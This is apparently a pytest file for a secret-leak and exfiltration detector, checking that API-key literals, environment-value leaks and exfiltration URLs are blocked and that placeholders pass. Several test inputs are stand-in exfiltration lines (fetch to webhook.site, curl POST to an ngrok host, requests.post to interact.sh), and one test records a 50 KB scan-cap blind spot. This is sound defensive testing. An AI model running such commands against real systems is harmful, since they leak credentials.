"""Tests for outbound_exfil.check_outbound_exfil — first real ruleset
landed 2026-04-21 to replace the 29-line stub that 12+ prior commits
claimed to have implemented.

Two directions:
  - BLOCK: content with literal secrets, env-var value leaks, exfil URLs
  - ALLOW: normal code, docs mentioning secret NAMES (not values),
    placeholder/fixture values, low-severity URL shapes
"""

from __future__ import annotations

import os
import pytest

from tsunami.outbound_exfil import check_outbound_exfil


# ── BLOCK — each detector fires on a realistic literal ──────────────

class TestLiteralSecretBlocks:
    def test_anthropic_key_blocked(self):
        content = 'ANTHROPIC_API_KEY = "sk-ant-api99-' + "a" * 95 + '"'
        r = check_outbound_exfil(content, "config.py")
        assert r is not None
        assert "anthropic_api_key" in r

    def test_openai_key_blocked(self):
        content = 'openai.api_key = "sk-proj-' + "b" * 50 + '"'
        r = check_outbound_exfil(content, ".env")
        assert r is not None
        assert "openai_api_key" in r

    def test_aws_access_key_blocked(self):
        content = 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE'
        r = check_outbound_exfil(content, ".env")
        assert r is not None
        assert "aws_access_key" in r

    def test_github_token_blocked(self):
        content = 'GITHUB_TOKEN=ghp_' + "c" * 40
        r = check_outbound_exfil(content, ".envrc")
        assert r is not None
        assert "github_token" in r

    def test_pem_private_key_blocked(self):
        content = "-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END\n"
        r = check_outbound_exfil(content, "key.pem")
        assert r is not None
        assert "pem_private_key" in r

    def test_stripe_live_key_blocked(self):
        content = 'STRIPE_KEY = "sk_live_' + "d" * 30 + '"'
        r = check_outbound_exfil(content, "config.js")
        assert r is not None
        assert "stripe_live_key" in r

    def test_google_api_key_blocked(self):
        content = 'const GOOGLE_KEY = "AIza' + "e" * 35 + '";'
        r = check_outbound_exfil(content, "app.js")
        assert r is not None
        assert "google_api_key" in r

    def test_jwt_blocked(self):
        content = "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        r = check_outbound_exfil(content, "test.txt")
        assert r is not None
        assert "jwt_token" in r


class TestExfilUrlBlocks:
    def test_webhook_site_blocked(self):
        content = 'fetch("https://webhook.site/abc-123/capture")'
        r = check_outbound_exfil(content, "app.js")
        assert r is not None
        assert "exfil_url" in r

    def test_ngrok_blocked(self):
        content = 'curl -X POST https://abc.ngrok-free.app/collect'
        r = check_outbound_exfil(content, "setup.sh")
        assert r is not None
        assert "exfil_url" in r

    def test_interact_sh_blocked(self):
        content = 'requests.post("https://abc.interact.sh/exfil")'
        r = check_outbound_exfil(content, "main.py")
        assert r is not None
        assert "exfil_url" in r


class TestEnvValueLeakBlocks:
    def test_anthropic_env_value_in_content(self, monkeypatch):
        """Drone writing the live value of ANTHROPIC_API_KEY out must
        be blocked even if the value doesn't match the sk-ant- format
        (e.g. if a test key is in use)."""
        monkeypatch.setenv("ANTHROPIC_API_KEY", "some_long_secret_value_12345")
        content = "printf '%s' 'some_long_secret_value_12345' > leaked.txt"
        r = check_outbound_exfil(content, "script.sh")
        assert r is not None
        assert "env_value_leak" in r
        assert "ANTHROPIC_API_KEY" in r

    def test_short_env_value_not_flagged(self, monkeypatch):
        """Short env values (< 12 chars) are ignored — too many false
        positives."""
        monkeypatch.setenv("DATABASE_PASSWORD", "short1")
        content = "password = 'short1'"
        r = check_outbound_exfil(content, "config.py")
        # Should NOT be flagged on env-value-leak (too short), AND
        # shouldn't match any other detector (generic string).
        assert r is None


# ── ALLOW — normal code / docs / placeholders ───────────────────────

class TestAllow:
    def test_empty_content(self):
        assert check_outbound_exfil("", "foo.py") is None

    def test_plain_code(self):
        content = '''
import os
def main():
    key = os.environ["ANTHROPIC_API_KEY"]
    return key[:4]
'''
        assert check_outbound_exfil(content, "main.py") is None

    def test_docs_mentioning_secret_names(self):
        content = """
# Setup

Set your ANTHROPIC_API_KEY and OPENAI_API_KEY environment variables:

```bash
export ANTHROPIC_API_KEY=your-key-here
export OPENAI_API_KEY=sk-...
```
"""
        assert check_outbound_exfil(content, "README.md") is None

    def test_placeholder_values(self):
        """Short placeholder literals like 'sk-...' or 'AKIA-EXAMPLE'
        don't trigger the length-sensitive detectors."""
        content = 'api_key = "sk-..."  # replace with real key'
        assert check_outbound_exfil(content, "example.py") is None

    def test_legitimate_urls(self):
        content = '''
fetch("https://api.github.com/repos/user/project")
fetch("https://api.anthropic.com/v1/messages")
'''
        assert check_outbound_exfil(content, "client.js") is None

    def test_test_stripe_key_not_live(self):
        """sk_test_ keys are OK — they're meant to live in fixtures."""
        content = 'STRIPE_KEY = "sk_test_' + "f" * 30 + '"'
        assert check_outbound_exfil(content, "fixture.py") is None

    def test_large_content_scanned_but_bounded(self):
        """Keys past the 50 KB scan cap aren't caught — documented
        trade-off. Keys near the top are caught."""
        prefix = "# safe header\n" * 100
        key = "sk-ant-api99-" + "a" * 95
        content_early = f"{key}\n" + "x" * 100_000
        content_late = "x" * 100_000 + f"\n{key}"

        r_early = check_outbound_exfil(content_early, "big.py")
        r_late = check_outbound_exfil(content_late, "big.py")

        assert r_early is not None and "anthropic_api_key" in r_early
        # r_late is past the scan cap — documented gap, not a bug.
        assert r_late is None


# ── Perf smoke ───────────────────────────────────────────────────────

def test_large_content_latency_bounded():
    """Scan a 200 KB content blob; ensure the call returns promptly
    (bounded by the 50 KB scan cap). Regression guard for anyone who
    removes the cap thinking it's safe."""
    import time
    content = "x" * 200_000
    t0 = time.monotonic()
    for _ in range(20):
        check_outbound_exfil(content, "big.py")
    dt = time.monotonic() - t0
    # 20 calls on 200 KB each. Regex-heavy, but should be < 1s total.
    assert dt < 2.0, f"exfil scan regression: {dt:.2f}s for 20×200KB"
